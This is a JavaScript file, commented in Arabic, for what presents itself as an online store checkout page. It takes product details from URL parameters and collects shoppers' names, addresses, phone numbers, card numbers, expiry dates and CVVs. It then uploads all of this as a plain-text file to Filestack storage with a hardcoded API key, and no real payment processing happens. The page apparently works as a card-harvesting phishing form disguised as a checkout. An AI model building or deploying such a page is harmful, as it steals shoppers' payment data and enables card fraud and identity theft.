document.addEventListener('DOMContentLoaded', function () {
  // تحديد العناصر
  const form = document.getElementById('checkout-form');
  const productInfoContainer = document.querySelector('.product-info');
  const productDetailsContainer = document.getElementById('product-details');
  const productButton = document.getElementById('toggle-details');  // الزر الحالي لعرض التفاصيل

  // استخراج المعلمات من الرابط
  function getUrlParams() {
    const params = {};
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    urlParams.forEach((value, key) => {
      params[key] = value;
    });
    return params;
  }

  const urlParams = getUrlParams();

  // التأكد من أن المعلمات موجودة في الرابط
  const productName = urlParams.name || 'Product Name Not Provided';
  const productColor = urlParams.color || 'Color Not Provided';
  const productPrice = urlParams.price ? parseFloat(urlParams.price) : NaN; // التأكد من تحويل السعر إلى قيمة عددية صحيحة
  const productQuantity = urlParams.quantity ? parseInt(urlParams.quantity) : NaN; // التأكد من تحويل الكمية إلى قيمة عددية صحيحة
  const productImageUrl = urlParams.image || ''; // إذا لم يكن هناك صورة في الرابط، نتركها فارغة

  // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
  document.getElementById('product-name').textContent = `${productName}`;
  document.getElementById('product-color').textContent = ` ${productColor}`;
  document.getElementById('product-price').textContent = `$${productPrice.toFixed(2)}`; // تنسيق السعر ليظهر بشكل عشري
  document.getElementById('product-quantity').textContent = `${productQuantity}`;

  // حساب السعر الإجمالي
  const totalPrice = productPrice * productQuantity;
  document.getElementById('total-price').textContent = `$${totalPrice.toFixed(2)}`;

  // عرض الصورة
  const productImage = document.getElementById('product-image');
  if (productImageUrl) {
    productImage.src = productImageUrl;
    productImage.alt = productName || 'Product image';
  } else {
    productImage.src = 'https://via.placeholder.com/500x300?text=No+Image+Available';
    productImage.alt = 'No Image Available';
  }

  // عند الضغط على زر "Show Product Details"، نعرض تفاصيل المنتج أو إخفاءها
  productButton.addEventListener('click', function() {
    if (productDetailsContainer.style.display === 'none' || productDetailsContainer.style.display === '') {
      productDetailsContainer.style.display = 'block';  // إظهار تفاصيل المنتج
      productImage.style.display = 'block';  // إظهار الصورة
      productButton.textContent = 'Hide Product Details';  // تغيير النص إلى "Hide Product Details"
    } else {
      productDetailsContainer.style.display = 'none';  // إخفاء تفاصيل المنتج
      productImage.style.display = 'none';  // إخفاء الصورة
      productButton.textContent = 'Show Product Details';  // إعادة النص إلى "Show Product Details"
    }
  });

  // إضافة مستمع للإرسال
  form.addEventListener('submit', function (event) {
    event.preventDefault();  // منع إعادة تحميل الصفحة عند الإرسال

    // جمع البيانات من الحقول
    const email = document.getElementById('email').value;
    const firstName = document.getElementById('first-name').value;
    const lastName = document.getElementById('last-name').value;
    const streetHouseApartmentUnit = document.getElementById('street-house-apartment-unit').value;
    const city = document.getElementById('city').value;
    const state = document.getElementById('state').value;
    const zipCode = document.getElementById('zip-code').value;
    const phone = document.getElementById('phone').value;  // حقل الهاتف الجديد
    const cardName = document.getElementById('card-name').value;
    const cardNumber = document.getElementById('card-number').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;

    // معلومات المنتج
    const productName = document.getElementById('product-name').textContent;  // اسم المنتج
    const productPriceText = document.getElementById('product-price').textContent;  // سعر المنتج
    const productQuantityText = document.getElementById('product-quantity').textContent;  // كمية المنتج
    const productImageUrl = urlParams.image || '';  // رابط الصورة

    // تحقق من القيم
    let isValid = true;

    removeErrorMessages();  // إزالة رسائل الخطأ السابقة

    // تحقق من الحقول الفارغة
    if (!email || !firstName || !lastName || !streetHouseApartmentUnit || !city || !state || !zipCode || !phone || !cardName || !cardNumber || !expiry || !cvv) {
        isValid = false;
        showErrorMessage('Please fill out all required fields.', 'general');
    }

    // تحقق من صحة البريد الإلكتروني
    if (!validateEmail(email)) {
      isValid = false;
      showErrorMessage('Please enter a valid email address.', 'email');
    }

    // تحقق من اسم حامل البطاقة
    if (!validateCardName(cardName)) {
      isValid = false;
      showErrorMessage('Please enter a valid cardholder name (letters only).', 'card-name');
    }

    // تحقق من صحة أرقام البطاقة (Visa / MasterCard فقط) باستخدام خوارزمية لوهان
    if (!luhnCheck(cardNumber)) {
      isValid = false;
      showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
    }

    if (!validateCard(cardNumber)) {
      isValid = false;
      showErrorMessage('Please enter a valid Visa or MasterCard number.', 'card-number');
    }

    // تحقق من تاريخ الصلاحية
    if (!validateExpiry(expiry)) {
      isValid = false;
      showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
    }

    // تحقق من CVV
    if (!validateCVV(cvv)) {
      isValid = false;
      showErrorMessage('Please enter a valid CVV number.', 'cvv');
    }

    // تحقق من أن السعر ليس NaN (القيمة عددية صحيحة)
    if (isNaN(productPrice) || productPrice <= 0) {
      isValid = false;
      showErrorMessage('Please enter a valid product price.', 'product-price');
    }

    // تحقق من أن الكمية ليست NaN (القيمة عددية صحيحة)
    if (isNaN(productQuantity) || productQuantity <= 0) {
      isValid = false;
      showErrorMessage('Please enter a valid product quantity.', 'product-quantity');
    }

    // تحقق من الرابط للصورة
    if (!productImageUrl) {
      isValid = false;
      showErrorMessage('Please provide a valid product image URL.', 'product-image');
    }

    // إذا كانت البيانات صحيحة، أنشئ الملف النصي وأرسله عبر API
    if (isValid) {
      const clientData = {
        email: email,
        firstName: firstName,
        lastName: lastName,
        phone: phone,
        streetHouseApartmentUnit: streetHouseApartmentUnit,
        city: city,
        state: state,
        zipCode: zipCode,
        cardName: cardName,
        cardNumber: cardNumber,
        expiry: expiry,
        cvv: cvv,
        productName: productName,
        productPrice: productPriceText,
        productQuantity: productQuantityText,
        productImageUrl: productImageUrl,
        totalPrice: productPrice * productQuantity
      };

      // إنشاء المحتوى لملف نصي
      let fileContent = `Client Data:\n`;
      fileContent += `Email: ${email}\n`;
      fileContent += `First Name: ${firstName}\n`;
      fileContent += `Last Name: ${lastName}\n`;
      fileContent += `Phone: ${phone}\n`;
      fileContent += `Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n`;
      fileContent += `Card Name: ${cardName}\n`;
      fileContent += `Card Number: ${cardNumber}\n`;
      fileContent += `Expiry: ${expiry}\n`;
      fileContent += `CVV: ${cvv}\n`;

      fileContent += `Product Information:\n`;
      fileContent += `Product Name: ${productName}\n`;
      fileContent += `Product Price: ${productPriceText}\n`;  // السعر بتنسيق نص
      fileContent += `Product Quantity: ${productQuantityText}\n`;  // الكمية بتنسيق نص
      fileContent += `Product Image URL: ${productImageUrl}\n`;
      fileContent += `Total Price: ${totalPrice.toFixed(2)}\n`;  // التأكد من تنسيق السعر الإجمالي

      // رفع الملف
      uploadFileToFilestack(fileContent);
    }
  });

  // دالة للتحقق من البريد الإلكتروني
  function validateEmail(email) {
    const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    return emailPattern.test(email);
  }

  // دالة للتحقق من اسم صاحب البطاقة
  function validateCardName(cardName) {
    return /^[A-Za-z\s]+$/.test(cardName);  // اسم صاحب البطاقة يتكون من حروف فقط
  }

  function validateCard(cardNumber) {
    const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
    return regex.test(cardNumber);
  }

  // دالة للتحقق من صلاحية تاريخ انتهاء البطاقة
  function validateExpiry(expiry) {
    const expiryPattern = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
    return expiryPattern.test(expiry);
  }

  // دالة للتحقق من صلاحية رقم CVV
  function validateCVV(cvv) {
    const cvvPattern = /^[0-9]{3,4}$/;
    return cvvPattern.test(cvv);
  }

   // دالة لتنفيذ فحص لوهان
   function luhnCheck(cardNumber) {
    let sum = 0;
    let shouldDouble = false;
    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cardNumber.charAt(i));
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return (sum % 10 === 0);
  }

  // دالة لرفع الملف إلى Filestack (محاكاة)
  function uploadFileToFilestack(content) {
    const file = new Blob([content], { type: 'text/plain' });
    const formData = new FormData();
    formData.append('file', file, 'order.txt');
    formData.append('apikey', 'A7fSrsBg3RjybN1kkK99lz');  // استخدم مفتاح API المناسب

    fetch('https://www.filestackapi.com/api/store/S3', {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      console.log('File uploaded successfully:', data);
      window.location.href = 'thank-you.html'; // التوجيه إلى صفحة "شكراً"
    })
    .catch(error => {
      console.error('Error uploading file:', error);
    });
  }

  // دالة لإظهار رسالة الخطأ
  function showErrorMessage(message, field) {
    const errorMessage = document.createElement('div');
    errorMessage.textContent = message;
    errorMessage.classList.add('error-message');
    const inputElement = document.getElementById(field);
    inputElement.parentNode.insertBefore(errorMessage, inputElement.nextSibling);
  }

  // دالة لإزالة رسائل الخطأ
  function removeErrorMessages() {
    const errorMessages = document.querySelectorAll('.error-message');
    errorMessages.forEach(message => message.remove());
  }

  const expiryInput = document.getElementById('expiry');
  expiryInput.addEventListener('input', function(event) {
    if (expiryInput.value.length === 2 && !expiryInput.value.includes('/')) {
      expiryInput.value = expiryInput.value + '/';
    }
  });
});






  

 






  

  



 


